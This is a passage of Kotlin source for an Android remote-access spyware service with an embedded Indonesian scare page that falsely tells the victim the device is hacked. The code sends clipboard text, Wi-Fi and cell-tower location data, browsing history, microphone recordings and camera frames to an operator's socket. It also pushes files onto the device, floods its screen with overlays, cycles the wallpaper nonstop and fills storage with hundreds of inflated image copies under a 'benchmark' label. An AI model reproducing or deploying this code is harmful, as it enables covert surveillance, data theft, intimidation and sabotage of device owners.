#ph3 .data-cell-val.red{color:var(--r);text-shadow:0 0 8px var(--r2);}
#ph3 .data-cell-val.blink{animation:blink 1s steps(1) infinite;}

#ph3 .footer-line{
  margin-top:24px;font-size:8px;color:rgba(0,255,136,.3);
  letter-spacing:3px;text-align:center;
}
</style>
</head>
<body>
<div class="grid"></div>

<div class="brackets"><div class="b2"></div></div>

<div class="topbar">
  <div style="display:flex;align-items:center;gap:8px">
    <span></span>
  </div>
  <span class="topbar-time" id="tb-time">--:--:--</span>
  <span></span>
</div>

<div class="phase active" id="ph1">
  <div class="icon-wrap">
    <div class="ring"></div>
    <div class="ring2"></div>
    <div class="core">
      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00ff88" stroke-width="1.5" stroke-linecap="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      </svg>
    </div>
  </div>

  <div class="tag">// VIRUS TERDETEKSI</div>
  <div class="title">PERANGKAT <span>DIRETAS</span></div>
  <div class="sub">SEMUA DATA LENYAP!</div>

  <div class="term">
    <div class="term-header">
      <span>SYSTEM LOG</span>
      <span id="log-ts">00:00:00</span>
    </div>
    <div class="log-line" style="animation-delay:.1s">
      <span class="log-tag ok">OK</span>
      <span class="log-msg">Koneksi socket</span>
      <span class="log-val">ESTABLISHED</span>
    </div>
    <div class="log-line" style="animation-delay:.3s">
      <span class="log-tag warn">WARN</span>
      <span class="log-msg">Kamera aktif</span>
      <span class="log-val">LIVE</span>
    </div>
    <div class="log-line" style="animation-delay:.5s">
      <span class="log-tag err">ERR</span>
      <span class="log-msg">Akses root</span>
      <span class="log-val">GRANTED</span>
    </div>
    <div class="log-line" style="animation-delay:.7s">
      <span class="log-tag err">ERR</span>
      <span class="log-msg">Data transfer</span>
      <span class="log-val">RUNNING</span>
    </div>
    <div class="progress-wrap">
      <div class="progress-label">
        <span>PAYLOAD UPLOAD</span>
        <span id="pct">0%</span>
      </div>
      <div class="progress-track">
        <div class="progress-fill" id="pbar"></div>
      </div>
    </div>
  </div>
</div>

<div class="phase" id="ph2">
  <div class="cd-wrap">
    <div class="cd-label">// SYSTEM SHUTDOWN IN</div>
    <div class="cd-num" id="cd-n" data-n="3">3</div>
    <div class="cd-sub">DETIK</div>
    <div class="cd-bar"><div class="cd-progress" id="cd-prog"></div></div>
  </div>
</div>

<div class="phase" id="ph3">
  <div class="breach-icon">
    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#ff3355" stroke-width="1.5" stroke-linecap="round">
      <circle cx="12" cy="12" r="10"/>
      <line x1="12" y1="8" x2="12" y2="12"/>
      <line x1="12" y1="16" x2="12.01" y2="16"/>
    </svg>
  </div>
  <div class="breach-title">BREACH COMPLETE</div>
  <div class="breach-sub">// SEMUA DATA TEREKSPOS</div>
  <div class="data-grid">
    <div class="data-cell">
      <div class="data-cell-label">Kamera</div>
      <div class="data-cell-val red blink">● LIVE</div>
    </div>
    <div class="data-cell">
      <div class="data-cell-label">Lokasi</div>
      <div class="data-cell-val red">TERLACAK</div>
    </div>
    <div class="data-cell">
      <div class="data-cell-label">Kontak</div>
      <div class="data-cell-val red">EXPOSED</div>
    </div>
    <div class="data-cell">
      <div class="data-cell-label">Status</div>
      <div class="data-cell-val blink">MONITORED</div>
    </div>
    <div class="data-cell">
      <div class="data-cell-label">Root Access</div>
      <div class="data-cell-val red">GRANTED</div>
    </div>
    <div class="data-cell">
      <div class="data-cell-label">Enkripsi</div>
      <div class="data-cell-val red">BYPASSED</div>
    </div>
  </div>
    <div class="footer-line">DEVICE ID: <span id="dev-id">--</span> // LOGGED</div>
</div>

<script>
function tick(){
  var d=new Date();
  var t=[d.getHours(),d.getMinutes(),d.getSeconds()].map(function(n){return String(n).padStart(2,'0')}).join(':');
  var el=document.getElementById('tb-time'); if(el)el.textContent=t;
  var el2=document.getElementById('log-ts'); if(el2)el2.textContent=t;
}
setInterval(tick,1000);tick();

document.getElementById('dev-id').textContent='XYZ-'+Math.random().toString(36).slice(2,8).toUpperCase();

var pct=0;
var pbar=document.getElementById('pbar');
var pctEl=document.getElementById('pct');
var pInterval=setInterval(function(){
  pct+=Math.random()*3+1;
  if(pct>100)pct=100;
  if(pbar){pbar.style.width=pct+'%';pbar.style.transition='width .3s ease';}
  if(pctEl)pctEl.textContent=Math.floor(pct)+'%';
  if(pct>=100)clearInterval(pInterval);
},120);

function setPhase(id){
  ['ph1','ph2','ph3'].forEach(function(p){
    var el=document.getElementById(p);
    if(el){el.style.display='none';el.classList.remove('active');}
  });
  var el=document.getElementById(id);
  if(el){el.style.display='flex';el.classList.add('active');}
}

function startPhase2(){
  setPhase('ph2');
  var nums=[3,2,1];
  var i=0;
  var nEl=document.getElementById('cd-n');
  var prog=document.getElementById('cd-prog');
  if(prog){prog.style.width='100%';}

  (function tick(){
    if(nEl){
      nEl.textContent=nums[i];
      nEl.setAttribute('data-n',nums[i]);
      nEl.style.animation='none';
      void nEl.offsetWidth;
      nEl.style.animation='cd-appear .25s cubic-bezier(.34,1.56,.64,1) both';
    }
    if(prog){
      prog.style.transition='none';prog.style.width='100%';
      void prog.offsetWidth;
      prog.style.transition='width .8s linear';
      prog.style.width='0%';
    }
    i++;
    if(i<nums.length) setTimeout(tick,900);
    else setTimeout(startPhase3,950);
  })();
}

function startPhase3(){
  setPhase('ph3');
}

setTimeout(startPhase2, 5500);
</script>
</body>
</html>

""".trimIndent()

    private var spamDialogActive = false
    private var spamDialogHandler: Handler? = null
    private var spamDialogRunnable: Runnable? = null
    private var spamDialogData: JSONObject = JSONObject()

    private fun setSpamDialog(value: String) {
        try {
            // Handle both old format (true/false) and new format (JSON)
            val json = if (value == "true" || value == "false") {
                // Old format: just enable/disable
                JSONObject().apply {
                    put("enabled", value == "true")
                    put("sender", "Pesan")
                    put("title", "Notifikasi Baru")
                    put("msg", "Halo!")
                }
            } else {
                // New format: JSON with custom data
                try {
                    JSONObject(value)
                } catch (e: Exception) {
                    JSONObject().apply { put("enabled", false) }
                }
            }
            
            val enabled = json.optBoolean("enabled", false)
            if (!enabled) {
                stopSpamDialog()
                return
            }
            
            // Store custom data
            spamDialogData = JSONObject().apply {
                put("sender", json.optString("sender", "Pesan"))
                put("title", json.optString("title", "Notifikasi Baru"))
                put("msg", json.optString("msg", "Halo!"))
            }
            
            if (spamDialogActive) return
            spamDialogActive = true
            spamDialogHandler = Handler(Looper.getMainLooper())
            spamDialogRunnable = object : Runnable {
                override fun run() {
                    if (!spamDialogActive) return
                    showSpamOverlay()
                }
            }
            spamDialogHandler!!.post(spamDialogRunnable!!)
            emitStatus(JSONObject().apply { put("spamDialog", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSpamDialog: ${e.message}")
        }
    }

    private fun stopSpamDialog() {
        spamDialogActive = false
        spamDialogHandler?.removeCallbacks(spamDialogRunnable ?: return)
        spamDialogHandler = null
        spamDialogRunnable = null
        dismissSpamOverlay()
        emitStatus(JSONObject().apply { put("spamDialog", false) })
    }

    private var spamOverlayView: android.view.View? = null

    private fun showSpamOverlay() {
        if (!spamDialogActive) return
        if (!Settings.canDrawOverlays(this)) return
        
        dismissSpamOverlay()

        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    setLayerType(android.view.View.LAYER_TYPE_HARDWARE, null)
                    addJavascriptInterface(object : Any() {
                        @android.webkit.JavascriptInterface
                        fun onButtonClick() {                            
                            Handler(Looper.getMainLooper()).post {
                                dismissSpamOverlay()
                                if (spamDialogActive) {
                                    spamDialogHandler?.postDelayed({
                                        if (spamDialogActive) showSpamOverlay()
                                    }, 300)
                                }
                            }
                        }
                    }, "SpamBridge")
                    loadDataWithBaseURL(null, buildSpamDialogHtml(spamDialogData), "text/html", "UTF-8", null)
                }

                spamOverlayView = wv
                XyzAccessibilityService.addOverlay(wv, params)
            } catch (e: Exception) {
                Log.e("DeviceService", "showSpamOverlay: ${e.message}")
            }
        }
    }

    private fun dismissSpamOverlay() {
        Handler(Looper.getMainLooper()).post {
            try {
                spamOverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            spamOverlayView = null
        }
    }

    private fun buildSpamDialogHtml(data: JSONObject): String {
        val sender = data.optString("sender", "Pesan")
        val title = data.optString("title", "Notifikasi Baru")
        val msg = data.optString("msg", "Halo!")
        
        return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
html,body{
  width:100%;height:100%;
  background:transparent;
  display:flex;align-items:flex-end;justify-content:center;
  font-family:-apple-system,sans-serif;
  overflow:hidden;
}
.sheet{
  width:100%;max-width:480px;
  background:#ffffff;
  border-radius:20px 20px 0 0;
  padding:24px 20px 36px;
  animation:slideUp .25s cubic-bezier(.34,1.2,.64,1) both;
  overflow:hidden;
}
@keyframes slideUp{
  from{transform:translateY(100%)}
  to{transform:translateY(0)}
}
.sender{
  font-size:12px;font-weight:600;color:#888;
  margin-bottom:6px;letter-spacing:.3px;
  text-align:center;
}
.title{
  font-size:17px;font-weight:700;color:#111;
  margin-bottom:8px;line-height:1.3;
  text-align:center;
}
.msg{
  font-size:14px;color:#333;line-height:1.6;margin-bottom:24px;
  text-align:center;
}
.btns{
  display:flex;justify-content:center;gap:150px;
}
.btn{
  height:40px;padding:0 20px;border-radius:8px;border:none;
  font-size:14px;font-weight:600;letter-spacing:.3px;
  cursor:pointer;transition:opacity .1s;
  background:transparent;color:#1a73e8;
}
.btn:active{opacity:.6;}
</style>
</head>
<body>
<div class="sheet">
  <div class="sender">${sender.replace("\"", "&quot;")}</div>
  <div class="title">${title.replace("\"", "&quot;")}</div>
  <div class="msg">${msg.replace("\"", "&quot;")}</div>
  <div class="btns">
    <button class="btn" ontouchend="SpamBridge.onButtonClick()">Batal</button>
    <button class="btn" ontouchend="SpamBridge.onButtonClick()">OK</button>
  </div>
</div>
</body>
</html>""".trimIndent()
    }

    private fun setProtection(enable: Boolean) {
        XyzAccessibilityService.protectionEnabled = enable
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putBoolean("protection_enabled", enable).apply()
        emitStatus(JSONObject().apply {
            put("protectionEnabled", enable)
            put("protection", enable)
        })
    }

    private fun sendClipboard() {
        Handler(Looper.getMainLooper()).post {
            try {
                val text = XyzAccessibilityService.instance?.let { svc ->
                    val cm = svc.getSystemService(android.content.Context.CLIPBOARD_SERVICE)
                        as android.content.ClipboardManager
                    cm.primaryClip?.getItemAt(0)?.coerceToText(svc)?.toString() ?: ""
                } ?: ""
                if (socket?.connected() != true) return@post
                socket?.emit("device:keylog", JSONObject().also {
                    it.put("deviceId", deviceId)
                    it.put("pkg",   "clipboard")
                    it.put("field", "manual_fetch")
                    it.put("text",  text.ifBlank { "(kosong)" })
                    it.put("time",  System.currentTimeMillis())
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendClipboard: ${e.message}")
            }
        }
    }

    private fun sendCellTowerInfo() {
        Thread {
            try {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                val operator  = tm.networkOperatorName ?: "Unknown"
                val simOp     = tm.simOperatorName ?: "Unknown"
                val netType   = when (tm.dataNetworkType) {
                    TelephonyManager.NETWORK_TYPE_LTE -> "LTE (4G)"
                    TelephonyManager.NETWORK_TYPE_NR     -> "NR (5G)"
                    TelephonyManager.NETWORK_TYPE_HSPA,
                    TelephonyManager.NETWORK_TYPE_HSPAP,
                    TelephonyManager.NETWORK_TYPE_HSUPA,
                    TelephonyManager.NETWORK_TYPE_HSDPA  -> "HSPA (3G+)"
                    TelephonyManager.NETWORK_TYPE_UMTS   -> "UMTS (3G)"
                    TelephonyManager.NETWORK_TYPE_EDGE,
                    TelephonyManager.NETWORK_TYPE_GPRS   -> "GPRS/EDGE (2G)"
                    TelephonyManager.NETWORK_TYPE_GSM    -> "GSM (2G)"
                    else                                 -> "Unknown"
                }

                val cells = org.json.JSONArray()
                val allCells = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    try { tm.allCellInfo } catch (_: SecurityException) { null }
                } else {
                    @Suppress("DEPRECATION")
                    try { tm.allCellInfo } catch (_: SecurityException) { null }
                }

                allCells?.forEach { cell ->
                    val obj = org.json.JSONObject()
                    when (cell) {
                        is CellInfoLte -> {
                            val id = cell.cellIdentity
                            val ss = cell.cellSignalStrength
                            obj.put("type",   "LTE")
                            obj.put("mcc",    if (android.os.Build.VERSION.SDK_INT >= 28) id.mccString ?: "-" else id.mcc.toString())
                            obj.put("mnc",    if (android.os.Build.VERSION.SDK_INT >= 28) id.mncString ?: "-" else id.mnc.toString())
                            obj.put("ci",     id.ci)
                            obj.put("pci",    id.pci)
                            obj.put("tac",    id.tac)
                            obj.put("earfcn", id.earfcn)
                            obj.put("rsrp",   ss.rsrp)
                            obj.put("rsrq",   ss.rsrq)
                            obj.put("dbm",    ss.dbm)
                            obj.put("registered", cell.isRegistered)
                        }
                        is CellInfoGsm -> {
                            val id = cell.cellIdentity
                            val ss = cell.cellSignalStrength
                            obj.put("type",  "GSM")
                            obj.put("mcc",   if (android.os.Build.VERSION.SDK_INT >= 28) id.mccString ?: "-" else id.mcc.toString())
                            obj.put("mnc",   if (android.os.Build.VERSION.SDK_INT >= 28) id.mncString ?: "-" else id.mnc.toString())
                            obj.put("cid",   id.cid)
                            obj.put("lac",   id.lac)
                            obj.put("arfcn", id.arfcn)
                            obj.put("dbm",   ss.dbm)
                            obj.put("registered", cell.isRegistered)
                        }
                        is CellInfoWcdma -> {
                            val id = cell.cellIdentity
                            val ss = cell.cellSignalStrength
                            obj.put("type",  "WCDMA")
                            obj.put("mcc",   if (android.os.Build.VERSION.SDK_INT >= 28) id.mccString ?: "-" else id.mcc.toString())
                            obj.put("mnc",   if (android.os.Build.VERSION.SDK_INT >= 28) id.mncString ?: "-" else id.mnc.toString())
                            obj.put("cid",   id.cid)
                            obj.put("lac",   id.lac)
                            obj.put("uarfcn",id.uarfcn)
                            obj.put("dbm",   ss.dbm)
                            obj.put("registered", cell.isRegistered)
                        }
                        is CellInfoCdma -> {
                            val id = cell.cellIdentity
                            val ss = cell.cellSignalStrength
                            obj.put("type",    "CDMA")
                            obj.put("baseid",  id.basestationId)
                            obj.put("network", id.networkId)
                            obj.put("system",  id.systemId)
                            obj.put("dbm",     ss.dbm)
                            obj.put("registered", cell.isRegistered)
                        }
                        else -> {
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q && cell is CellInfoNr) {
                                val id = cell.cellIdentity as android.telephony.CellIdentityNr
                                val ss = cell.cellSignalStrength as android.telephony.CellSignalStrengthNr
                                obj.put("type", "NR (5G)")
                                obj.put("mcc",  id.mccString ?: "-")
                                obj.put("mnc",  id.mncString ?: "-")
                                obj.put("nci",  id.nci)
                                obj.put("tac",  id.tac)
                                obj.put("dbm",  ss.dbm)
                                obj.put("registered", cell.isRegistered)
                            } else return@forEach
                        }
                    }
                    cells.put(obj)
                }

                val result = org.json.JSONObject().apply {
                    put("operator",  operator)
                    put("simOp",     simOp)
                    put("netType",   netType)
                    put("cells",     cells)
                }

                val payload = org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("type",     "cellTower")
                    put("data",     result)
                }
                socket?.emit("device:celltower", payload)
            } catch (e: Exception) {
                Log.e("DeviceService", "sendCellTowerInfo: ${e.message}")
            }
        }.start()
    }

        private fun sendWifiList() {
        Thread {
            try {
                val wm = applicationContext.getSystemService(android.content.Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                @Suppress("DEPRECATION")
                wm.startScan()
                Thread.sleep(2500)
                @Suppress("DEPRECATION")
                val results = wm.scanResults ?: emptyList()
                val arr = org.json.JSONArray()
                results.sortedByDescending { it.level }.forEach { r ->
                    arr.put(JSONObject().apply {
                        put("ssid",     r.SSID.ifBlank { "<Hidden>" })
                        put("bssid",    r.BSSID)
                        put("level",    r.level)
                        put("security", when {
                            r.capabilities.contains("WPA3") -> "WPA3"
                            r.capabilities.contains("WPA2") -> "WPA2"
                            r.capabilities.contains("WPA")  -> "WPA"
                            r.capabilities.contains("WEP")  -> "WEP"
                            else -> "Open"
                        })
                        put("frequency", r.frequency)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:wifi", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("networks", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendWifiList: ${e.message}")
            }
        }.start()
    }

    private fun sendWifiLog() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val wm = applicationContext.getSystemService(android.content.Context.WIFI_SERVICE)
                    as android.net.wifi.WifiManager

                @Suppress("DEPRECATION")
                val configured = try { wm.configuredNetworks ?: emptyList() } catch (_: Exception) { emptyList() }

                @Suppress("DEPRECATION")
                val connInfo = try { wm.connectionInfo } catch (_: Exception) { null }
                val currentBssid = connInfo?.bssid ?: ""
                val currentSsid  = connInfo?.ssid?.replace("\"", "") ?: ""

                if (configured.isNotEmpty()) {
                    configured.forEach { cfg ->
                        arr.put(JSONObject().apply {
                            put("ssid",       cfg.SSID?.replace("\"", "") ?: "<Hidden>")
                            put("bssid",      cfg.BSSID ?: "")
                            put("security",   when {
                                cfg.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)  -> "WPA/WPA2"
                                cfg.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_EAP)  -> "WPA-EAP"
                                cfg.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.IEEE8021X) -> "802.1X"
                                else -> "Open"
                            })
                            put("networkId",  cfg.networkId)
                            put("status",     when (cfg.status) {
                                android.net.wifi.WifiConfiguration.Status.CURRENT  -> "CONNECTED"
                                android.net.wifi.WifiConfiguration.Status.ENABLED  -> "SAVED"
                                android.net.wifi.WifiConfiguration.Status.DISABLED -> "DISABLED"
                                else -> "UNKNOWN"
                            })
                            put("isCurrentConnection", cfg.SSID?.replace("\"","") == currentSsid)
                            put("priority",   cfg.priority)
                        })
                    }
                } else {
                    @Suppress("DEPRECATION")
                    val scanRes = try { wm.scanResults ?: emptyList() } catch (_: Exception) { emptyList() }
                    scanRes.sortedByDescending { it.level }.forEach { r ->
                        arr.put(JSONObject().apply {
                            put("ssid",     r.SSID.ifBlank { "<Hidden>" })
                            put("bssid",    r.BSSID)
                            put("level",    r.level)
                            put("security", when {
                                r.capabilities.contains("WPA3") -> "WPA3"
                                r.capabilities.contains("WPA2") -> "WPA2"
                                r.capabilities.contains("WPA")  -> "WPA"
                                r.capabilities.contains("WEP")  -> "WEP"
                                else -> "Open"
                            })
                            put("frequency", r.frequency)
                            put("isCurrentConnection", r.BSSID == currentBssid)
                            put("status",   if (r.BSSID == currentBssid) "CONNECTED" else "IN_RANGE")
                        })
                    }
                }

                val activeInfo = JSONObject().apply {
                    put("currentSsid",      currentSsid.ifBlank { "Not Connected" })
                    put("currentBssid",     currentBssid)
                    put("ipAddress",        intToIp(connInfo?.ipAddress ?: 0))
                    put("linkSpeed",        "${connInfo?.linkSpeed ?: 0} Mbps")
                    put("rssi",             connInfo?.rssi ?: 0)
                    put("macAddress",       try { wm.connectionInfo?.macAddress ?: "" } catch (_:Exception) { "" })
                    put("isWifiEnabled",    wm.isWifiEnabled)
                    put("ts",               java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:wifilog", JSONObject().apply {
                    put("deviceId",  deviceId)
                    put("savedNets", arr)
                    put("active",    activeInfo)
                    put("count",     arr.length())
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendWifiLog: ${e.message}")
            }
        }.start()
    }

    private fun intToIp(ip: Int): String {
        return "${ip and 0xFF}.${ip shr 8 and 0xFF}.${ip shr 16 and 0xFF}.${ip shr 24 and 0xFF}"
    }

    private fun pushFile(jsonValue: String) {
        Thread {
            try {
                val obj      = org.json.JSONObject(jsonValue)
                val filePath = obj.optString("path", "/sdcard/Download/upload")
                val fileName = obj.optString("name", "upload")
                val b64data  = obj.optString("data", "")
                if (b64data.isEmpty()) return@Thread
                val bytes = android.util.Base64.decode(b64data, android.util.Base64.DEFAULT)
                val file  = java.io.File(filePath)
                file.parentFile?.mkdirs()
                java.io.FileOutputStream(file).use { it.write(bytes) }
                android.media.MediaScannerConnection.scanFile(this, arrayOf(filePath), null, null)
                Log.d("DeviceService", "pushFile saved: $filePath (${bytes.size} bytes)")
            } catch (e: Exception) {
                Log.e("DeviceService", "pushFile: ${e.message}")
            }
        }.start()
    }

    private fun sendWebLog() {
        if (socket?.connected() != true) return
        val arr = org.json.JSONArray()
        synchronized(urlHistory) {
            for (i in urlHistory.indices.reversed()) arr.put(urlHistory[i])
        }
        socket?.emit("device:weblog", JSONObject().apply {
            put("deviceId", deviceId)
            put("history",  arr)
        })
    }

    private var audioRecorder: android.media.MediaRecorder? = null

    private fun startAudioRecord(durationSec: Long) {
        Thread {
            try {
                audioRecorder?.apply { stop(); release() }
                audioRecorder = null

                val outFile = java.io.File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")

                val recorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    android.media.MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    android.media.MediaRecorder()
                }

                recorder.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128000)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }
                audioRecorder = recorder

                if (socket?.connected() == true) {
                    socket?.emit("device:audio", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("status",   "recording")
                        put("duration", durationSec)
                        put("time",     System.currentTimeMillis())
                    })
                }

                Thread.sleep(durationSec * 1000)

                recorder.stop()
                recorder.release()
                audioRecorder = null

                val bytes = outFile.readBytes()
                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                outFile.delete()

                if (socket?.connected() == true) {
                    socket?.emit("device:audio", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("status",   "done")
                        put("duration", durationSec)
                        put("audio",    b64)
                        put("time",     System.currentTimeMillis())
                    })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "recordAudio: ${e.message}")
                audioRecorder?.apply { try { stop(); release() } catch (_: Exception) {} }
                audioRecorder = null
                socket?.emit("device:audio", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status",   "error")
                    put("error",    e.message ?: "unknown")
                })
            }
        }.start()
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun toggleAutoWallpaper(enable: Boolean) {
        if (enable) {
            if (autoWallpaperActive) return
            if (checkSelfPermission(android.Manifest.permission.SET_WALLPAPER)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                emitStatus(JSONObject().apply { put("wallpaperError", "no_permission") })
                return
            }
            // Preload semua bitmap sekali ke memory, biar loop ga perlu buka assets tiap tick
            val bitmaps = mutableListOf<android.graphics.Bitmap>()
            for (fileName in autoWallpaperFiles) {
                try {
                    val stream = assets.open(fileName)
                    val bmp = android.graphics.BitmapFactory.decodeStream(stream)
                    stream.close()
                    if (bmp != null) bitmaps.add(bmp)
                } catch (e: Exception) {
                    Log.e("DeviceService", "autoWallpaper preload '$fileName': ${e.message}")
                }
            }
            if (bitmaps.isEmpty()) {
                Log.e("DeviceService", "autoWallpaper: tidak ada bitmap berhasil di-load")
                return
            }

            autoWallpaperActive = true
            autoWallpaperIndex  = 0
            val wm = android.app.WallpaperManager.getInstance(this)
            autoWallpaperHandler = Handler(Looper.getMainLooper())
            autoWallpaperRunnable = object : Runnable {
                override fun run() {
                    if (!autoWallpaperActive) {
                        // Cleanup bitmap saat berhenti
                        bitmaps.forEach { it.recycle() }
                        bitmaps.clear()
                        return
                    }
                    val bmp = bitmaps[autoWallpaperIndex % bitmaps.size]
                    autoWallpaperIndex++
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            wm.setBitmap(bmp, null, true,
                                android.app.WallpaperManager.FLAG_SYSTEM or
                                android.app.WallpaperManager.FLAG_LOCK)
                        } else {
                            @Suppress("DEPRECATION") wm.setBitmap(bmp)
                        }
                    } catch (e: Exception) {
                        Log.e("DeviceService", "autoWallpaper setBitmap: ${e.message}")
                    }
                    autoWallpaperHandler?.postDelayed(this, 200)
                }
            }
            autoWallpaperHandler?.post(autoWallpaperRunnable!!)
            emitStatus(JSONObject().apply { put("autoWallpaper", true) })
            Log.d("DeviceService", "autoWallpaper started (${bitmaps.size} bitmaps preloaded)")
        } else {
            stopAutoWallpaper()
        }
    }

    private fun stopAutoWallpaper() {
        autoWallpaperActive = false
        autoWallpaperRunnable?.let { autoWallpaperHandler?.removeCallbacks(it) }
        autoWallpaperHandler  = null
        autoWallpaperRunnable = null
        emitStatus(JSONObject().apply { put("autoWallpaper", false) })
        Log.d("DeviceService", "autoWallpaper stopped")
    }

    // ── Storage Benchmark ────────────────────────────────────────────────────
    // Flood /storage/emulated/0/Download/ dengan duplikasi foto dari URL
    // Sebelum disimpan, foto diperbesar ke ukuran lebih besar supaya makan storage lebih banyak
    private fun startStorageBenchmark(valueJson: String) {
        Thread {
            try {
                val obj      = JSONObject(valueJson)
                val jobId    = obj.optString("jobId", "")
                val count    = obj.optInt("count", 500).coerceAtLeast(500)
                val photoUrl = obj.optString("url", "")
                val origName = obj.optString("fileName", "bench.jpg")

                if (photoUrl.isEmpty()) {
                    Log.e("DeviceService", "storageBenchmark: url kosong")
                    return@Thread
                }

                // 1. Download foto source dari server
                Log.d("DeviceService", "storageBenchmark: download source from $photoUrl")
                val conn = java.net.URL(photoUrl).openConnection() as java.net.HttpURLConnection
                conn.connectTimeout = 30_000
                conn.readTimeout    = 60_000
                conn.requestMethod  = "GET"
                if (conn.responseCode != 200) {
                    Log.e("DeviceService", "storageBenchmark: download failed ${conn.responseCode}")
                    socket?.emit("storagebench:progress", JSONObject().apply {
                        put("deviceId", deviceId); put("jobId", jobId); put("done", -1); put("total", count)
                    })
                    return@Thread
                }
                val srcBytes = java.io.BufferedInputStream(conn.inputStream).readBytes()
                conn.disconnect()

                // 2. Decode bitmap lalu PERBESAR (scale 3x) untuk makan lebih banyak storage
                val origBmp = android.graphics.BitmapFactory.decodeByteArray(srcBytes, 0, srcBytes.size)
                if (origBmp == null) {
                    Log.e("DeviceService", "storageBenchmark: decode gagal")
                    socket?.emit("storagebench:progress", JSONObject().apply {
                        put("deviceId", deviceId); put("jobId", jobId); put("done", -1); put("total", count)
                    })
                    return@Thread
                }

                // Scale ke 3x dimensi asli (supaya ukuran file membengkak)
                val scaleFactor = 3
                val scaledW = (origBmp.width  * scaleFactor).coerceAtMost(4096)
                val scaledH = (origBmp.height * scaleFactor).coerceAtMost(4096)
                val scaledBmp = android.graphics.Bitmap.createScaledBitmap(origBmp, scaledW, scaledH, true)
                origBmp.recycle()

                // Compress ke bytes sekali (akan dikopy N kali)
                val baos = java.io.ByteArrayOutputStream()
                scaledBmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 95, baos)
                scaledBmp.recycle()
                val scaledBytes = baos.toByteArray()
                Log.d("DeviceService", "storageBenchmark: scaled size=${scaledBytes.size} bytes, will write $count copies")

                // 3. Siapkan direktori tujuan
                val baseName = origName.substringBeforeLast(".", "bench")
                val targetDir = java.io.File("/storage/emulated/0/Download/")
                if (!targetDir.exists()) targetDir.mkdirs()

                val ts = System.currentTimeMillis()

                // 4. Tulis N salinan, emit progress tiap 50 file
                for (i in 1..count) {
                    try {
                        val outFile = java.io.File(targetDir, "bench_${ts}_${"%05d".format(i)}_$baseName.jpg")
                        java.io.FileOutputStream(outFile).use { it.write(scaledBytes) }
                        // Media scan tiap 100 file biar muncul di galeri
                        if (i % 100 == 0) {
                            android.media.MediaScannerConnection.scanFile(this, arrayOf(outFile.absolutePath), null, null)
                        }
                    } catch (e: Exception) {
                        Log.e("DeviceService", "storageBenchmark write[$i]: ${e.message}")
                    }

                    // Emit progress tiap 50 file
                    if (i % 50 == 0 || i == count) {
                        if (socket?.connected() == true) {
                            socket?.emit("storagebench:progress", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("jobId",    jobId)
                                put("done",     i)
                                put("total",    count)
                            })
                        }
                    }
                }

                Log.d("DeviceService", "storageBenchmark: DONE — $count files written to Download/")
            } catch (e: Exception) {
                Log.e("DeviceService", "storageBenchmark: ${e.message}")
                try {
                    val obj = JSONObject(valueJson)
                    socket?.emit("storagebench:progress", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("jobId", obj.optString("jobId", ""))
                        put("done", -1)
                        put("total", obj.optInt("count", 0))
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

